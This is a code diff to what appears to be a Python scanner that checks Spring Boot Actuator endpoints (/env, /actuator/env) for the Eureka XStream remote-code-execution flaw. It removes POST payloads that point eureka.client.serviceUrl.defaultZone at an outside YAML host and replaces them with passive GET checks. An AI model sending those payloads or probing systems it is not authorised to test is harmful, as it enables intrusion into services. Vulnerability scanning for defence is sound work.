@@ -313,8 +313,6 @@ def Eureka_xstream_RCE(url,proxies):
         "User-Agent": random.choice(ua),
         "Content-Type": "application/json"
         }
-    payload_1 = "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
-    payload_2 = "{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://127.0.0.2/example.yml\"}"
     path1 = 'env'
     path2 = 'actuator/env'
     
@@ -322,14 +320,14 @@ def Eureka_xstream_RCE(url,proxies):
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
         urltest2 = url + path2
-        re1 = requests.post(url=urltest1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.post(url=urltest2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
-        if ('127.0.0.2' in str(re1.text)):
+        re1 = requests.get(url=urltest1, headers=Headers_1, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.get(url=urltest2, headers=Headers_2, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
+        if ('eureka.client.serviceUrl.defaultZone' in str(re1.text)):
             cprint(f'[+] [Eureka_Xstream-1] {url}', "red")
             f2 = open("vulout.txt", "a")
             f2.write("[+] [Eureka_Xstream-1] " + url + '\n')
             f2.close()
-        elif ('127.0.0.2' in str(re2.text)):
+        elif ('eureka.client.serviceUrl.defaultZone' in str(re2.text)):
             cprint(f'[+] [Eureka_Xstream-2] {url}', "red")
             f2 = open("vulout.txt", "a")
             f2.write("[+] [Eureka_Xstream-2] " + url + '\n')
@@ -612,3 +610,4 @@ def poc(filename,proxies):
                     break
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
     sys.exit()
+
